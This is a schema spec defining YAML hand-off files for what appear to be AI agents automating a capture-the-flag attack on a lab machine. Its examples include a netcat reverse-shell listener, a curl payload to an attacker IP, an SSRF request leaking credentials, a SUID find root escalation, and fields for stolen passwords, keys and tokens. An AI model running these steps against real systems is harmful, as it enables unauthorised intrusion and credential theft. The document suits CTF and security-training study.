# CTF Inter-Agent Output Schemas

> Defines the YAML formats agents use to pass data between phases.
> All output files live in `loot/`.

---

## ctf-context.yaml (operator-provided input)

```yaml
target:
  ip: "10.10.11.42"
  name: "Editorial"
  os: "linux"           # linux | windows | unknown
  difficulty: "easy"    # easy | medium | hard | insane
  category: "fullpwn"   # fullpwn | web | pwn | crypto | forensics | misc

vpn:
  iface: "tun0"
  ovpn_file: "/workspace/htb.ovpn"   # path to .ovpn file; omit if already connected
```

---

## engagement_status.yaml

```yaml
target:
  ip: "10.10.11.42"
  name: "Editorial"
started_at: "2026-08-15T10:00:00Z"
current_phase: "privesc"           # startup | recon | exploit | foothold | privesc | flags | complete
phases_completed: ["startup", "recon", "exploit", "foothold"]
flags_captured: 1                  # 0, 1 (user), or 2 (user+root)
notes: ""
```

---

## recon_results.yaml

```yaml
metadata:
  target_ip: "10.10.11.42"
  generated_at: "2026-08-15T10:05:00Z"
  agent: "ReconAgent"

open_ports:
  - port: 22
    protocol: tcp
    service: ssh
    version: "OpenSSH 8.9p1"
    banner: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
  - port: 80
    protocol: tcp
    service: http
    version: "nginx 1.18.0"
    title: "Editorial"

web_endpoints:
  - url: "http://10.10.11.42/"
    status: 200
    tech: ["nginx", "Python/Flask"]
    interesting: false
  - url: "http://10.10.11.42/upload"
    status: 200
    tech: ["nginx", "Python/Flask"]
    interesting: true
    notes: "File upload form"

dns:
  hostname: "editorial.htb"
  added_to_hosts: true

attack_vectors:
  - type: web
    confidence: high
    notes: "File upload + SSRF potential on /upload"
  - type: exploit
    confidence: medium
    notes: "nginx 1.18.0 — check for path traversal CVEs"
```

---

## foothold.yaml

```yaml
obtained_at: "2026-08-15T10:45:00Z"
agent: "WebTestAgent"
method: "SSRF → internal API credential leak"
shell_type: "reverse_shell"        # reverse_shell | bind_shell | webshell | rce_cmd | ssh
user: "www-data"
hostname: "editorial"
os: "linux"
listener: "nc -lvnp 4444"
payload: "curl http://10.10.14.5:4444/..."
notes: "Got creds for dev user from internal API at 127.0.0.1:5000"
```

---

## loot.yaml

```yaml
# Append entries as loot is discovered. Do not overwrite — append.
credentials:
  - username: "dev"
    password: "dev080217_devAPI\!@"
    service: "ssh"
    host: "10.10.11.42"
    port: 22
    discovered_by: "WebTestAgent"
    discovered_at: "2026-08-15T10:50:00Z"

hashes:
  - username: "root"
    hash: "$6$rounds=5000$..."
    type: "sha512crypt"
    cracked: false
    discovered_by: "PrivEscAgent"
    discovered_at: "2026-08-15T11:10:00Z"

tokens:
  - type: "jwt"
    value: "eyJ..."
    context: "admin API token found in /opt/app/config.py"
    discovered_by: "PrivEscAgent"

keys:
  - type: "ssh_private_key"
    path_on_target: "/home/dev/.ssh/id_rsa"
    saved_to: "loot/dev_id_rsa"
    discovered_by: "PrivEscAgent"

files:
  - name: "config.py"
    path_on_target: "/opt/app/config.py"
    saved_to: "loot/config.py"
    notes: "Contains DB credentials and JWT secret"
```

---

## flags.yaml

```yaml
user_flag:
  value: "HTB{abc123...}"
  path: "/home/dev/user.txt"
  captured_at: "2026-08-15T10:55:00Z"
  user_context: "dev"

root_flag:
  value: "HTB{xyz789...}"
  path: "/root/root.txt"
  captured_at: "2026-08-15T11:20:00Z"
  user_context: "root"
```

---

## exploit_log.yaml (written by LoggerAgent — mandatory)

```yaml
# Chronological record of every confirmed exploit, credential, and flag.
# Agents append entries immediately on success. Never batch — log in real time.
entries:
  - timestamp: "2026-08-15T14:45:00Z"
    agent: "WebTestAgent"
    type: "exploit"           # exploit | rce | shell | credential | hash | key | flag
    title: "SSRF via /upload endpoint → internal API credential leak"
    severity: "critical"      # critical | high | medium | low
    target:
      ip: "10.10.11.42"
      port: 80
      url: "http://10.10.11.42/upload"
      parameter: "url"
    payload:
      type: "http_request"    # http_request | shell_command | file_read | sql | other
      method: "POST"
      body: "url=http://127.0.0.1:5000/api/latest/metadata/messages/authors"
      notes: "Internal metadata API returns plaintext creds"
    response:
      status_code: 200
      body_excerpt: '{"dev": "dev080217_devAPI!@"}'
      evidence_file: "loot/evidence/web_001_ssrf_response.txt"
    impact: "Credential disclosure → SSH foothold as dev"
    follow_on: "SSH dev:dev080217_devAPI!@ on port 22"

  - timestamp: "2026-08-15T15:10:00Z"
    agent: "PrivEscAgent"
    type: "rce"
    title: "SUID /usr/bin/find → root shell"
    severity: "critical"
    target:
      ip: "10.10.11.42"
      path: "/usr/bin/find"
    payload:
      type: "shell_command"
      command: "find . -exec /bin/bash -p \\; -quit"
      notes: "GTFObins: find with -exec runs as owner (root)"
    response:
      output: "uid=0(root) gid=0(root)"
      shell_type: "suid_shell"
      user: "root"
    impact: "Root shell — read /root/root.txt"

  - timestamp: "2026-08-15T15:15:00Z"
    agent: "FlagAgent"
    type: "flag"
    title: "root.txt captured"
    severity: "critical"
    target:
      ip: "10.10.11.42"
      path: "/root/root.txt"
    payload:
      type: "shell_command"
      command: "cat /root/root.txt"
    response:
      output: "HTB{s0m3_fl4g_v4lu3}"
    impact: "Machine rooted"
```

---

## findings.yaml (optional — for web/exploit findings worth documenting)

```yaml
findings:
  - id: "WEB-001"
    title: "SSRF via /upload endpoint"
    severity: "Critical"
    description: "The /upload form fetches user-supplied URLs server-side without validation."
    steps_to_reproduce:
      - "POST /upload with url=http://127.0.0.1:5000/api/latest/metadata/messages/authors"
      - "Response contains internal API credentials in plaintext"
    impact: "Internal service access, credential disclosure → SSH foothold"
    evidence: "loot/ssrf_response.txt"
```
